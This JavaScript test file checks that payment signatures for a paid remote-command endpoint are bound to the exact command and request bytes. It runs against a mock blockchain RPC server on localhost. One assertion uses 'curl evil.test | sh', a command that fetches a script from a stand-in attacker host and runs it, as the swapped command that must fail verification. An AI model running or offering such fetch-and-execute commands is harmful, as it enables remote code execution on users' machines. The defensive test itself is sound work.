import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdtempSync } from "node:fs";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { privateKeyToAccount } from "viem/accounts";
import { recoverMessageAddress } from "viem";
import { boundMessage } from "./codec.mjs";

const payer = privateKeyToAccount("0x" + "11".repeat(32));
const TX = "0x" + "ab".repeat(32);
const hash = (c) => createHash("sha256").update(c, "utf8").digest("hex");

test("a payment signed for one command does not verify against another", async () => {
  const paid = "nvidia-smi";
  const sig = await payer.signMessage({ message: boundMessage(TX, hash(paid)) });

  const honest = await recoverMessageAddress({ message: boundMessage(TX, hash(paid)), signature: sig });
  assert.equal(honest, payer.address, "the payer's own command must verify");

  const swapped = await recoverMessageAddress({
    message: boundMessage(TX, hash("curl evil.test | sh")),
    signature: sig,
  });
  assert.notEqual(swapped, payer.address, "a swapped command still recovered the payer");
});

test("the legacy transaction-only signature no longer recovers the payer", async () => {
  const sig = await payer.signMessage({ message: boundMessage(TX, hash("nvidia-smi")) });
  const legacy = await recoverMessageAddress({ message: TX, signature: sig });
  assert.notEqual(legacy, payer.address, "the unbound form still passed");
});

// The rest of this file is the same contract end to end: what a shipped client
// signs has to be what the endpoint recomputes, against a chain that answers.
const USDG = "0x5fc5360D0400a0Fd4f2af552ADD042D716F1d168";
const TRANSFER_TOPIC = "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef";
const PAY_TO = "0xEcaaE714912C38fA7e0dAF78afa7C54DbeD11039";
const PRICE = 300_000;
const word = (address) => `0x${"0".repeat(24)}${address.slice(2).toLowerCase()}`;

/// One transfer of the asking price, from the payer to the endpoint's payee,
/// twelve blocks deep. Everything the verifier reads and nothing it does not.
function chainThatSaw(txHash, from) {
  const log = {
    address: USDG,
    blockHash: `0x${"11".repeat(32)}`,
    blockNumber: "0x1",
    data: `0x${PRICE.toString(16).padStart(64, "0")}`,
    logIndex: "0x0",
    removed: false,
    topics: [TRANSFER_TOPIC, word(from), word(PAY_TO)],
    transactionHash: txHash,
    transactionIndex: "0x0",
  };
  const receipt = {
    blockHash: log.blockHash,
    blockNumber: "0x1",
    contractAddress: null,
    cumulativeGasUsed: "0x0",
    effectiveGasPrice: "0x0",
    from,
    gasUsed: "0x0",
    logs: [log],
    logsBloom: `0x${"00".repeat(256)}`,
    status: "0x1",
    to: USDG,
    transactionHash: txHash,
    transactionIndex: "0x0",
    type: "0x2",
  };
  const answers = {
    eth_chainId: "0x1237",
    eth_blockNumber: "0xd",
    eth_getTransactionReceipt: receipt,
  };
  return createServer((req, res) => {
    if (req.method !== "POST") {
      res.writeHead(404).end();
      return;
    }
    const chunks = [];
    req.on("data", (chunk) => chunks.push(chunk));
    req.on("end", () => {
      const call = JSON.parse(Buffer.concat(chunks));
      const result = answers[call.method] ?? null;
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ jsonrpc: "2.0", id: call.id, result }));
    });
  });
}

function listening(server) {
  return new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve(server.address().port)));
}

/// A payment the SDK produced, redeemed against the endpoint the SDK is for.
/// The two hashed different things once: the client signed the bytes it sent
/// and the server signed the command it read out of them, so the recovered
/// address matched no transfer and the USDG was stranded on chain.
test("the digest a shipped client signs is the digest /run recomputes", async (t) => {
  const chain = chainThatSaw(TX, payer.address);
  const rpcPort = await listening(chain);
  t.after(() => chain.close());

  const port = 18404;
  const child = spawn(process.execPath, [fileURLToPath(new URL("./server.mjs", import.meta.url))], {
    env: {
      ...process.env,
      PRISM_AGENT_KEY: `0x${"11".repeat(32)}`,
      PRISM_ESCROW: PAY_TO,
      X402_PAY_TO: PAY_TO,
      X402_PORT: String(port),
      X402_BASE_PAY_TO: "",
      PRISM_RPC_URL: `http://127.0.0.1:${rpcPort}`,
      PRISM_API_BASE: `http://127.0.0.1:${rpcPort}`,
      X402_PAYMENTS_FILE: join(mkdtempSync(join(tmpdir(), "x402-binding-")), "consumed.log"),
    },
    stdio: ["ignore", "ignore", "ignore"],
  });
  t.after(() => child.kill());

  const body = JSON.stringify({ command: "nvidia-smi" });
  const post = async (signature) =>
    fetch(`http://127.0.0.1:${port}/run`, {
      method: "POST",
      headers: {
        "content-type": "application/json",
        "x-payment": Buffer.from(JSON.stringify({ txHash: TX, signature, network: "eip155:4663" })).toString("base64"),
      },
      body,
    });

  for (let attempt = 0; ; attempt += 1) {
    try {
      if ((await fetch(`http://127.0.0.1:${port}/healthz`)).ok) break;
    } catch {
      if (attempt > 60) throw new Error("x402 server did not start");
    }
    await new Promise((resolve) => setTimeout(resolve, 250));
  }

  // Refused first, because a refusal leaves the transfer redeemable and this is
  // the digest nothing on the client side computes.
  const overTheCommand = await post(await payer.signMessage({ message: boundMessage(TX, hash("nvidia-smi")) }));
  assert.equal(overTheCommand.status, 402);
  assert.equal((await overTheCommand.json()).error, "no_matching_payment");

  const paid = await post(await payer.signMessage({ message: boundMessage(TX, hash(body)) }));
  assert.equal(paid.status, 202, "a payment signed over the request bytes must redeem");
  assert.ok((await paid.json()).job_id);
});
